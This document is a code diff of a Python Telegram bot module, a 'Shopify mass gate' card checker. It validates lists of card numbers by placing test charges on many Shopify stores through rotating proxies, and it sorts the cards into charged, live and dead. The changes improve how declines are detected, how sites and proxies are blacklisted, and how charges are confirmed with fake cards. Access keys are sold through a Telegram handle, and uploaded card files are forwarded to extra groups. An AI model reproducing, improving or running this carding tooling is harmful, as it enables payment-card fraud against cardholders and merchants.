         f"<b><tg-emoji emoji-id='5039895103947146186'>🌐</tg-emoji> 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛</b> Shopify\n"
@@ -1368,8 +1411,9 @@ async def update_progress_message(bot: Bot, session_id):
         except Exception as e:
             logging.error(f"Error updating progress: {e}")
 
+
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# SINGLE CARD PROCESSING - WITH SMART RETRY LOGIC
+# SINGLE CARD PROCESSING
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, user_obj, plan_name):
@@ -1400,12 +1444,15 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
             await update_progress_message(bot, session_id)
         return
 
+    # Fix L: FRAUD_SUSPECTED removed — it is a site-level risk gate, not a
+    # card-level decline. Leaving it in would mark live cards as DEAD on
+    # risk-blocked sites; removing it lets the else branch blacklist the
+    # site and retry, which is the correct behaviour.
     DECLINED_RESPONSES = [
         'CARD_DECLINED', 'PROCESSING_ERROR',
         'GENERIC_DECLINE', 'DO NOT HONOR', 'DO_NOT_HONOR',
         'UNKNOWN_ERROR', 'Processing Error',
         'PICK_UP_CARD', 'DECISION_RULE_BLOCK',
-        'FRAUD_SUSPECTED',
         'INVALID_PURCHASE_TYPE', 'INVALID_PAYMENT_METHOD',
         'TEST_MODE_LIVE_CARD', 'AMOUNT_TOO_SMALL',
         'INCORRECT_NUMBER', 'EXPIRED_CARD'
@@ -1420,17 +1467,19 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
 
     MAX_RETRIES = 15
     attempt = 0
+    rate_limit_streak = 0           # Fix H: bound total RL back-offs
 
     parts = cc_formatted.split('|')
     cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
-    if len(yy) == 2: yy = "20" + yy
+    if len(yy) == 2:
+        yy = "20" + yy
 
     if is_session_stopped(session_id):
         return
 
     try:
         bin_data = await get_bin_info(cc_num[:6])
-    except:
+    except Exception:
         bin_data = {}
 
     if is_session_stopped(session_id):
@@ -1458,11 +1507,19 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
         if is_session_stopped(session_id):
             return
 
+        # Fix E: if every site is blacklisted, abort the card instead of
+        # picking the same dead site over and over for the remaining
+        # attempts.
         blacklisted = GLOBAL_BLACKLISTED_SITES | session.get('_blacklisted_sites', set())
         clean_sites = [s for s in sites_list if s not in blacklisted]
         if not clean_sites:
-            logging.warning("[MSH] All sites blacklisted! Using full list.")
-            clean_sites = sites_list
+            logging.warning(
+                f"[MSH] All {len(sites_list)} sites blacklisted for session "
+                f"{session_id} — aborting card {cc_formatted}"
+            )
+            result_status = "ERROR"
+            response_msg = "All sites blacklisted (fake charge detected)"
+            break
         site = random.choice(clean_sites)
 
         try:
@@ -1484,7 +1541,14 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
 
             message_upper = message.upper()
             message_lower = message.lower()
-            is_charged_response = any(k in message_upper for k in ["ORDER_PLACED", "CHARGED", "THANK YOU"])
+
+            # Fix K: strict CHARGED detection — avoids matching
+            # "PRE-CHARGED" / "CHARGED_BACK" from a rogue API response.
+            is_charged_response = (
+                "ORDER_PLACED" in message_upper
+                or "ORDER PLACED" in message_upper
+                or message_upper in {"CHARGED", "THANK YOU", "THANK_YOU"}
+            )
 
             if is_charged_response:
                 logging.info(f"[MSH] Potential CHARGED on {site}. Running multi-card verification...")
@@ -1509,17 +1573,34 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
                         response_msg = "Site Error (Blacklisted Fake Site)"
                         break
 
+                # Fix I: use a different proxy per fake card so a single
+                # dead proxy doesn't invalidate all four verification runs.
                 async def _verify_fake(fake_card):
+                    fp = proxy_manager.get_next_proxy()
+                    if not fp:
+                        return False
+                    fp_proxy, _ = fp
                     try:
-                        success, fmsg, _, _, _, _, _, _ = await process_card_api(
+                        _, fmsg, _, _, _, _, _, _ = await process_card_api(
                             cc=fake_card["cc"], mes=fake_card["mes"],
                             ano=fake_card["ano"], cvv=fake_card["cvv"],
-                            site=site, proxy=proxy
+                            site=site, proxy=fp_proxy
                         )
                         fmsg_up = fmsg.upper()
-                        return any(k in fmsg_up for k in ["ORDER_PLACED", "CHARGED", "THANK YOU", "SUCCESS",  "PAID", "APPROVED"])
+                        is_fake_charged = (
+                            "ORDER_PLACED" in fmsg_up
+                            or "ORDER PLACED" in fmsg_up
+                            or fmsg_up in {"CHARGED", "THANK YOU", "THANK_YOU",
+                                           "SUCCESS", "PAID", "APPROVED"}
+                        )
+                        return is_fake_charged
                     except Exception:
                         return False
+                    finally:
+                        try:
+                            proxy_manager.report_result(fp_proxy, fmsg, None)
+                        except Exception:
+                            pass
 
                 fake_results = await asyncio.gather(
                     *[_verify_fake(fc) for fc in FAKE_CARDS],
@@ -1532,9 +1613,9 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
                     session.setdefault('_blacklisted_sites', set()).add(site)
                     GLOBAL_BLACKLISTED_SITES.add(site)
                     _save_to_blacklist(site)
-                    
-                    print(f"\033[91m[ALERT] FAKE CHARGED DETECTION SYSTEM SYSTEM ON: {site} ({fake_charged}/4 fake cards passed!)\033[0m")
-                    
+
+                    print(f"\033[91m[ALERT] FAKE CHARGED DETECTION SYSTEM ON: {site} ({fake_charged}/4 fake cards passed!)\033[0m")
+
                     try:
                         sites_file = os.path.join(os.path.dirname(__file__), "sites.txt")
                         if os.path.exists(sites_file):
@@ -1545,12 +1626,11 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
                                 for s in updated_active_sites:
                                     wf.write(f"{s}\n")
                             print(f"\033[93m[REMOVED] Site {site} instantly removed from active sites.txt!\033[0m")
-                            logging.info(f"[MSH] Successfully removed fake site from sites.txt: {site}")
                     except Exception as fe:
                         logging.error(f"[MSH] Error removing fake site from file: {fe}")
 
                     logging.warning(
-                        f"[MSH] <tg-emoji emoji-id='5040030395416969985'>🚫</tg-emoji> FAKE SITE PERMANENTLY BLACKLISTED & REMOVED: {site} "
+                        f"[MSH] FAKE SITE PERMANENTLY BLACKLISTED & REMOVED: {site} "
                         f"({fake_charged}/4 fake cards charged)"
                     )
                     if attempt < MAX_RETRIES:
@@ -1563,8 +1643,7 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
                 else:
                     print(f"\033[92m[LEGIT] REAL CHARGE CONFIRMED on {site}! All 4 verification cards declined.\033[0m")
                     logging.info(
-                        f"[MSH] <tg-emoji emoji-id='5341715473882955310'>✅</tg-emoji> REAL CHARGE CONFIRMED on {site}! "
-                        f"All 4 fake cards declined. Charge is legit."
+                        f"[MSH] REAL CHARGE CONFIRMED on {site}! All 4 fake cards declined."
                     )
                     result_status = "CHARGED"
                     response_msg = message
@@ -1584,18 +1663,29 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
                 is_proxy_error = proxy_manager.is_real_proxy_error(message, http_status)
 
                 if is_proxy_error:
+                    # Fix H: real network error shouldn't consume a retry.
                     if attempt >= MAX_RETRIES:
                         result_status = "ERROR"
                         response_msg = f"Proxy Error: {message}"
                         break
                     else:
+                        attempt = max(0, attempt - 1)
                         await asyncio.sleep(0.1)
                         continue
                 else:
                     session.setdefault('_blacklisted_sites', set()).add(site)
 
-                    is_rate_limit = any(rl in message_lower for rl in ["429", "too many requests", "http 429", "generic_error", "generic error", "throttled"])
+                    is_rate_limit = any(rl in message_lower for rl in
+                                        ["429", "too many requests", "http 429",
+                                         "generic_error", "generic error", "throttled"])
                     if is_rate_limit:
+                        rate_limit_streak += 1
+                        # Fix H: if we keep hitting RL on different sites,
+                        # bail — no more useful work to do.
+                        if rate_limit_streak >= 5:
+                            result_status = "ERROR"
+                            response_msg = f"Rate limited {rate_limit_streak}x on different sites"
+                            break
                         attempt = max(0, attempt - 1)
                         await asyncio.sleep(0.3)
 
@@ -1669,24 +1759,34 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
         )
 
         if sent_to_extra:
-            await asyncio.gather(
-                asyncio.to_thread(update_user_stats, user_id, True),
-                asyncio.to_thread(log_hit_to_mshh, user_id, user_obj.username, user_obj.first_name),
-            )
+            # Fix J: await stats and logging separately so a failure in one
+            # doesn't mask the other.
+            try:
+                await asyncio.to_thread(update_user_stats, user_id, True)
+            except Exception as e:
+                logging.error(f"[MSH] update_user_stats failed: {e}")
+            try:
+                await asyncio.to_thread(log_hit_to_mshh, user_id, user_obj.username, user_obj.first_name)
+            except Exception as e:
+                logging.error(f"[MSH] log_hit_to_mshh failed: {e}")
         else:
             logging.warning(
                 f"[MSH] CHARGED on {site} but delivery to extra groups failed — "
                 f"counting as hit only, not as a charge."
             )
-            await asyncio.to_thread(update_user_stats, user_id, False)
+            try:
+                await asyncio.to_thread(update_user_stats, user_id, False)
+            except Exception as e:
+                logging.error(f"[MSH] update_user_stats failed: {e}")
 
     elif result_status == "APPROVED":
         session['approved'] += 1
         session['live_cards'].append(card_result_data)
 
-        await asyncio.gather(
-            asyncio.to_thread(update_user_stats, user_id, True),
-        )
+        try:
+            await asyncio.to_thread(update_user_stats, user_id, True)
+        except Exception as e:
+            logging.error(f"[MSH] update_user_stats failed: {e}")
 
         if "insufficient" in str(response_msg).lower():
             await asyncio.gather(
@@ -1702,19 +1802,25 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
         session['dead'] += 1
         session['dead_cards'].append(card_result_data)
 
-        await asyncio.gather(
-            asyncio.to_thread(update_user_stats, user_id, False),
-        )
+        try:
+            await asyncio.to_thread(update_user_stats, user_id, False)
+        except Exception as e:
+            logging.error(f"[MSH] update_user_stats failed: {e}")
+
     elif result_status == "ERROR":
         session['errors'] += 1
         session['error_cards'].append(card_result_data)
-        await asyncio.to_thread(update_user_stats, user_id, False)
+        try:
+            await asyncio.to_thread(update_user_stats, user_id, False)
+        except Exception as e:
+            logging.error(f"[MSH] update_user_stats failed: {e}")
 
     if is_session_stopped(session_id):
         return
 
     if session['checked'] % 3 == 0 or session['checked'] == session['total']:
         await update_progress_message(bot, session_id)
+
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # CALLBACK HANDLERS
@@ -1729,13 +1835,12 @@ async def handle_result_callback(callback: types.CallbackQuery, callback_data: M
         session = MSH_SESSIONS.get(session_id)
 
         if not session:
-            await callback.answer("<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> Session expired", show_alert=True)
+            await callback.answer("❌ Session expired", show_alert=True)
             return
 
         if callback.from_user.id != session.get('user_id'):
-            await callback.answer("<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> No permission", show_alert=True)
+            await callback.answer("❌ No permission", show_alert=True)
             return
-
 
         count = 0
         if result_type == "charged":
@@ -1754,7 +1859,7 @@ async def handle_result_callback(callback: types.CallbackQuery, callback_data: M
 
         if count == 0:
             type_names = {"charged": "Charged", "live": "Live", "dead": "Dead", "all": ""}
-            await callback.answer(f"<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> No {type_names.get(result_type, '')} cards found", show_alert=True)
+            await callback.answer(f"❌ No {type_names.get(result_type, '')} cards found", show_alert=True)
             return
 
         await callback.answer("📦 Generating report...", show_alert=False)
@@ -1780,8 +1885,6 @@ async def handle_result_callback(callback: types.CallbackQuery, callback_data: M
             f"<tg-emoji emoji-id='5039895103947146186'>🌐</tg-emoji> 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗠𝗮𝘀𝘀"
         )
 
-
-
         document = types.BufferedInputFile(file=file_content, filename=filename)
 
         try:
@@ -1806,9 +1909,10 @@ async def handle_result_callback(callback: types.CallbackQuery, callback_data: M
     except Exception as e:
         logging.error(f"Error handling result callback: {e}", exc_info=True)
         try:
-            await callback.message.answer(f"<tg-emoji emoji-id='5040030395416969985'>🚫</tg-emoji> Error: <code>{str(e)[:50]}</code>", parse_mode="HTML")
+            await callback.message.answer(f"🚫 Error: <code>{str(e)[:50]}</code>", parse_mode="HTML")
         except:
             pass
+
 
 @router.callback_query(MshStopCallback.filter())
 async def handle_stop_callback(callback: types.CallbackQuery, callback_data: MshStopCallback):
@@ -1818,13 +1922,12 @@ async def handle_stop_callback(callback: types.CallbackQuery, callback_data: Msh
         session = MSH_SESSIONS.get(session_id)
 
         if not session:
-            await callback.answer("<tg-emoji emoji-id='5456140674028019486'>🛑</tg-emoji> Session expired", show_alert=True)
+            await callback.answer("🛑 Session expired", show_alert=True)
             return
 
         if callback.from_user.id != session.get('user_id'):
-            await callback.answer("<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> No permission", show_alert=True)
+            await callback.answer("❌ No permission", show_alert=True)
             return
-
 
         if session['status'] != "CHECKING":
             await callback.answer("ℹ️ Not running", show_alert=True)
@@ -1833,7 +1936,7 @@ async def handle_stop_callback(callback: types.CallbackQuery, callback_data: Msh
         session['status'] = "STOPPED"
 
         print(f"🛑 [MSH] Stop signal sent")
-        logging.info(f"❌ [MSH] Stop signal sent")
+        logging.info(f"🛑 [MSH] Stop signal sent")
 
         cancelled_count = 0
         for task in session.get('tasks', []):
@@ -1841,10 +1944,10 @@ async def handle_stop_callback(callback: types.CallbackQuery, callback_data: Msh
                 task.cancel()
                 cancelled_count += 1
 
-        await callback.answer("<tg-emoji emoji-id='5040030395416969985'>🚫</tg-emoji> Stopping...", show_alert=False)
+        await callback.answer("🚫 Stopping...", show_alert=False)
 
         print(f"🚫 [MSH] Cancelled {cancelled_count} tasks")
-        logging.info(f"❌ [MSH] Cancelled {cancelled_count} tasks")
+        logging.info(f"🚫 [MSH] Cancelled {cancelled_count} tasks")
 
         proxy_manager = session.get('proxy_manager')
         if proxy_manager:
@@ -1858,9 +1961,10 @@ async def handle_stop_callback(callback: types.CallbackQuery, callback_data: Msh
     except Exception as e:
         logging.error(f"Error handling stop callback: {e}", exc_info=True)
         try:
-            await callback.answer("<tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> Error stopping", show_alert=True)
+            await callback.answer("⚠️ Error stopping", show_alert=True)
         except:
             pass
+
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # ADMIN: STOP ALL RUNNING CHECKS FROM ALL USERS
@@ -1868,14 +1972,9 @@ async def handle_stop_callback(callback: types.CallbackQuery, callback_data: Msh
 
 @router.message(F.text.startswith("/stopmsh"))
 async def stopmsh_command(message: types.Message):
-    """Admin-only: stop every running MSH check across all users."""
     user = message.from_user
     if user.id not in ADMIN_IDS:
-        await message.reply(
-            "<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> "
-            "<b>𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱.</b>",
-            parse_mode="HTML"
-        )
+        await message.reply("❌ <b>𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱.</b>", parse_mode="HTML")
         return
 
     running_sessions = [
@@ -1884,11 +1983,7 @@ async def stopmsh_command(message: types.Message):
     ]
 
     if not running_sessions:
-        await message.reply(
-            "<tg-emoji emoji-id='5039844895779455925'>🍾</tg-emoji> "
-            "<b>𝗡𝗼 𝗮𝗰𝘁𝗶𝘃𝗲 𝗰𝗵𝗲𝗰𝗸𝘀 𝗿𝘂𝗻𝗻𝗶𝗻𝗴.</b>",
-            parse_mode="HTML"
-        )
+        await message.reply("🍾 <b>𝗡𝗼 𝗮𝗰𝘁𝗶𝘃𝗲 𝗰𝗵𝗲𝗰𝗸𝘀 𝗿𝘂𝗻𝗻𝗶𝗻𝗴.</b>", parse_mode="HTML")
         return
 
     stopped = []
@@ -1915,8 +2010,7 @@ async def stopmsh_command(message: types.Message):
                     await message.bot.send_message(
                         chat_id=owner_id,
                         text=(
-                            "<tg-emoji emoji-id='5040030395416969985'>🚫</tg-emoji> "
-                            "<b>𝗬𝗼𝘂𝗿 𝗰𝗵𝗲𝗰𝗸 𝘄𝗮𝘀 𝘀𝘁𝗼𝗽𝗽𝗲𝗱 𝗯𝘆 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.</b>\n"
+                            "🚫 <b>𝗬𝗼𝘂𝗿 𝗰𝗵𝗲𝗰𝗸 𝘄𝗮𝘀 𝘀𝘁𝗼𝗽𝗽𝗲𝗱 𝗯𝘆 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.</b>\n"
                             f"<b><tg-emoji emoji-id='5406683434124859552'>🆔</tg-emoji> 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗜𝗗 ➛</b> <code>{session_id}</code>"
                         ),
                         parse_mode="HTML"
@@ -1938,7 +2032,7 @@ async def stopmsh_command(message: types.Message):
             logging.error(f"[stopmsh] Error stopping session {session_id}: {e}")
 
     lines = [
-        "<tg-emoji emoji-id='5040030395416969985'>🚫</tg-emoji> <b>𝗔𝗟𝗟 𝗠𝗦𝗛 𝗖𝗛𝗘𝗖𝗞𝗦 𝗦𝗧𝗢𝗣𝗣𝗘𝗗</b>",
+        "🚫 <b>𝗔𝗟𝗟 𝗠𝗦𝗛 𝗖𝗛𝗘𝗖𝗞𝗦 𝗦𝗧𝗢𝗣𝗣𝗘𝗗</b>",
         "━━━━━━━━━━━━━━━━━━━━",
         f"<b><tg-emoji emoji-id='5341715473882955310'>✅</tg-emoji> 𝗦𝗲𝘀𝘀𝗶𝗼𝗻𝘀 ➛</b> <code>{len(stopped)}</code>",
         ""
@@ -1952,6 +2046,7 @@ async def stopmsh_command(message: types.Message):
 
     await message.reply("\n".join(lines), parse_mode="HTML")
 
+
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # MAIN COMMAND
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -1959,7 +2054,7 @@ async def stopmsh_command(message: types.Message):
 @router.message(lambda message: (message.text and message.text.startswith("/msh")) or (message.caption and message.caption.startswith("/msh")))
 async def msh_command(message: types.Message):
     if not await asyncio.to_thread(is_gate_enabled, "msh"):
-        await message.reply("<tg-emoji emoji-id='4958926882994127612'>🚧</tg-emoji> <b>𝗠𝗮𝘀𝘀 𝗚𝗮𝘁𝗲 𝘂𝗻𝗱𝗲𝗿 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲.</b>", parse_mode="HTML")
+        await message.reply("🚧 <b>𝗠𝗮𝘀𝘀 𝗚𝗮𝘁𝗲 𝘂𝗻𝗱𝗲𝗿 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲.</b>", parse_mode="HTML")
         return
 
     user = message.from_user
@@ -1969,10 +2064,7 @@ async def msh_command(message: types.Message):
 
     is_premium, _ = get_premium_status(user_id)
     if not is_premium:
-        await message.reply(
-    "<tg-emoji emoji-id='5042050649248760772'>💎</tg-emoji>GET KEY FROM @Lanxo2",
-            parse_mode="HTML"
-        )
+        await message.reply("💎 GET KEY FROM @Lanxo2", parse_mode="HTML")
         return
 
     is_checking = False
@@ -1983,9 +2075,9 @@ async def msh_command(message: types.Message):
 
     if is_checking:
         await message.reply(
-            "<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> <b>𝗔𝗰𝘁𝗶𝘃𝗲 𝗦𝗲𝘀𝘀𝗶𝗼𝗻</b>\n\n"
+            "❌ <b>𝗔𝗰𝘁𝗶𝘃𝗲 𝗦𝗲𝘀𝘀𝗶𝗼𝗻</b>\n\n"
             "You have a check running.\n"
-            "Use the <b><tg-emoji emoji-id='5040030395416969985'>🚫</tg-emoji> Stop</b> button to stop it.",
+            "Use the <b>🚫 Stop</b> button to stop it.",
             parse_mode="HTML"
         )
         return
@@ -1993,7 +2085,7 @@ async def msh_command(message: types.Message):
     user_proxies = await get_user_proxies(user_id)
     if not user_proxies:
         await message.reply(
-            "<tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> <b>𝗡𝗼 𝗣𝗿𝗼𝘅𝗶𝗲𝘀!</b>\n\n"
+            "⚠️ <b>𝗡𝗼 𝗣𝗿𝗼𝘅𝗶𝗲𝘀!</b>\n\n"
             "Add proxies using <code>/proxy</code> command.",
             parse_mode="HTML"
         )
@@ -2030,7 +2122,7 @@ async def msh_command(message: types.Message):
                 logging.error(f"Failed to forward txt file to extra group {group_id}: {e}")
 
         if document.file_size > 2 * 1024 * 1024:
-            await message.reply("<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> File too large. Max  2MB.")
+            await message.reply("❌ File too large. Max 2MB.")
             return
         try:
             file_info = await bot.get_file(document.file_id)
@@ -2039,12 +2131,12 @@ async def msh_command(message: types.Message):
                 data = byte_content.read() if hasattr(byte_content, 'read') else byte_content
                 raw_text += data.decode('utf-8', errors='ignore')
         except Exception as e:
-            await message.reply(f"<tg-emoji emoji-id='5040030395416969985'>🚫</tg-emoji> Error reading file: {e}")
+            await message.reply(f"🚫 Error reading file: {e}")
             return
 
     if not raw_text.strip():
         await message.reply(
-            "<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> <b>𝗡𝗼 𝗰𝗮𝗿𝗱𝘀 𝗳𝗼𝘂𝗻𝗱.</b>\n\n"
+            "❌ <b>𝗡𝗼 𝗰𝗮𝗿𝗱𝘀 𝗳𝗼𝘂𝗻𝗱.</b>\n\n"
             "• <code>/msh cc|mm|yy|cvv</code>\n"
             "• Reply to cards with <code>/msh</code>\n"
             "• Send .txt file with <code>/msh</code>",
@@ -2054,7 +2146,7 @@ async def msh_command(message: types.Message):
 
     extracted_cards = extract_cards_from_text(raw_text)
     if not extracted_cards:
-        await message.reply("<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> No valid card formats found.")
+        await message.reply("❌ No valid card formats found.")
         return
 
     valid_cards = []
@@ -2082,12 +2174,13 @@ async def msh_command(message: types.Message):
         filter_info = ""
         if expired_count > 0 or invalid_luhn_count > 0:
             filter_info = f"Filtered {invalid_luhn_count} invalid & {expired_count} expired.\n"
-        await message.reply(f"{filter_info}<tg-emoji emoji-id='5456140674028019486'>🛑</tg-emoji> No valid cards to check.", parse_mode="HTML")
+        await message.reply(f"{filter_info}🛑 No valid cards to check.", parse_mode="HTML")
         return
 
     is_group = message.chat.type in ("group", "supergroup", "channel")
 
     asyncio.create_task(process_mass_check_background(message, bot, valid_cards, user, user_proxies, is_group))
+
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # BACKGROUND PROCESSING
@@ -2104,7 +2197,7 @@ async def process_mass_check_background(message: types.Message, bot: Bot, valid_
 
     total_cards = len(valid_cards)
     if total_cards == 0:
-        await message.reply("<tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> No valid cards to check.", parse_mode="HTML")
+        await message.reply("⚠️ No valid cards to check.", parse_mode="HTML")
         return
 
     session_id = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
@@ -2128,16 +2221,29 @@ async def process_mass_check_background(message: types.Message, bot: Bot, valid_
         f"<b><tg-emoji emoji-id='5406683434124859552'>🆔</tg-emoji> 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗜𝗗 ➛</b> <code>{session_id}</code>"
     )
 
-    initial_buttons = get_result_buttons(session_id, is_running=True)
+    # Fix F: defensive read of per-user custom sites.
+    try:
+        user_custom_sites = await asyncio.to_thread(get_user_sites_db, user_id)
+    except Exception as e:
+        logging.error(f"[MSH] get_user_sites_db failed for {user_id}: {e}")
+        user_custom_sites = None
 
-    progress_msg = await message.reply(initial_text, parse_mode="HTML", reply_markup=initial_buttons)
+    if user_custom_sites:
+        active_sites = user_custom_sites
+        site_source = f"CUSTOM ({len(user_custom_sites)} sites)"
+    else:
+        active_sites = get_sites()
+        site_source = f"GLOBAL ({len(active_sites)} sites)"
 
-    MSH_SESSIONS[session_id] = {
+    # Fix G: build the session dict FIRST so any button tap arriving during
+    # the reply latency finds an existing session. msg_id starts at None
+    # and update_progress_message() no-ops until it is set.
+    session_dict = {
         "session_id": session_id,
         "status": "CHECKING",
         "chat_id": chat_id,
         "user_id": user_id,
-        "msg_id": progress_msg.message_id,
+        "msg_id": None,
         "user_msg_id": message.message_id,
         "total": total_cards,
         "checked": 0,
@@ -2159,22 +2265,17 @@ async def process_mass_check_background(message: types.Message, bot: Bot, valid_
         "user_obj": user_obj,
         "plan_name": plan_name,
         "is_group": is_group,
+        "sites_list": active_sites,
     }
+    MSH_SESSIONS[session_id] = session_dict
 
-    user_custom_sites = await asyncio.to_thread(get_user_sites_db, user_id)
-    if user_custom_sites:
-        active_sites = user_custom_sites
-        site_source = f"CUSTOM ({len(user_custom_sites)} sites)"
-    else:
-        active_sites = get_sites()
-        site_source = f"GLOBAL ({len(active_sites)} sites)"
-    MSH_SESSIONS[session_id]["sites_list"] = active_sites
+    initial_buttons = get_result_buttons(session_id, is_running=True)
+    progress_msg = await message.reply(initial_text, parse_mode="HTML", reply_markup=initial_buttons)
+    session_dict['msg_id'] = progress_msg.message_id
 
-    # v4.6.6 fix (Fix 2): abort early if no sites loaded. Without this,
-    # every card in the session fails with the same "no sites" error and
-    # spams the log N times. One clear message beats N silent failures.
+    # Abort early if no sites loaded — one clear message beats N silent failures.
     if not active_sites:
-        MSH_SESSIONS[session_id]["status"] = "FINISHED"
+        session_dict["status"] = "FINISHED"
         try:
             await bot.edit_message_text(
                 chat_id=chat_id,
@@ -2191,9 +2292,7 @@ async def process_mass_check_background(message: types.Message, bot: Bot, valid_
             )
         except Exception as e:
             logging.error(f"[MSH] Could not edit progress message on empty-sites abort: {e}")
-        logging.error(
-            f"[MSH] Session {session_id} aborted — no sites in DB or sites.txt"
-        )
+        logging.error(f"[MSH] Session {session_id} aborted — no sites in DB or sites.txt")
         return
 
     print(f"🚀 [MSH] Started - {total_cards} cards - User: {user_id} - Sites: {site_source} - Proxies: {len(user_proxies)} - Group: {is_group}")
@@ -2201,9 +2300,11 @@ async def process_mass_check_background(message: types.Message, bot: Bot, valid_
 
     asyncio.create_task(run_mass_checker(bot, session_id, valid_cards, user_obj, plan_name))
 
+
 async def run_mass_checker(bot: Bot, session_id, cards, user_obj, plan_name):
     session = MSH_SESSIONS.get(session_id)
-    if not session: return
+    if not session:
+        return
 
     sem = asyncio.Semaphore(260)
 
